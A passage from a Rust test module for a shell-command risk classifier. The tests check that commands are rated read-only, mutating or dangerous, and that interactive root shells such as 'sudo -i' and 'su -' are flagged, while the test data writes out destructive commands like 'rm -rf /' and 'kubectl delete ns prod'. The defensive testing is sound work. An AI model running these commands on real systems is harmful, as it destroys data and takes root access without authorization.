        assert_eq!(risk_of("echo $(ls"), Risk::Mutating);
        assert_eq!(risk_of("eval 'rm -rf /tmp/x'"), Risk::Mutating);
        assert_eq!(risk_of(""), Risk::Mutating);
        assert_eq!(risk_of("   "), Risk::Mutating);
    }

    #[test]
    fn reason_is_human_readable() {
        let c = classify("rm -rf /");
        assert!(c.reason.contains("rm"), "reason = {}", c.reason);
        let c = classify("ls -la");
        assert!(c.reason.contains("只读"), "reason = {}", c.reason);
        let c = classify("kubectl delete ns prod");
        assert!(c.reason.contains("kubectl"), "reason = {}", c.reason);
    }

    #[test]
    fn interactive_root_shell_is_dangerous() {
        // `sudo -i` / `sudo -s` / `su -` 剥离前缀后为空，但绝不能当只读放行
        for cmd in [
            "sudo -i",
            "sudo --login",
            "sudo -s",
            "sudo --shell",
            "sudo -Hsi",
            "su",
            "su -",
            "su -l",
            "su --login",
            "su root",
            "su 0",
        ] {
            assert_eq!(
                risk_of(cmd),
                Risk::Dangerous,
                "`{cmd}` 应判为高危（交互式 root shell）"
            );
        }

        // 反例：普通 sudo 与 su -c 执行单条命令不应被判成 root shell
        assert_eq!(risk_of("sudo ls -la"), Risk::ReadOnly);
        assert_eq!(risk_of("sudo -u root df -h"), Risk::ReadOnly);
        assert_eq!(risk_of("su -c 'ls -la'"), Risk::ReadOnly);
    }
}
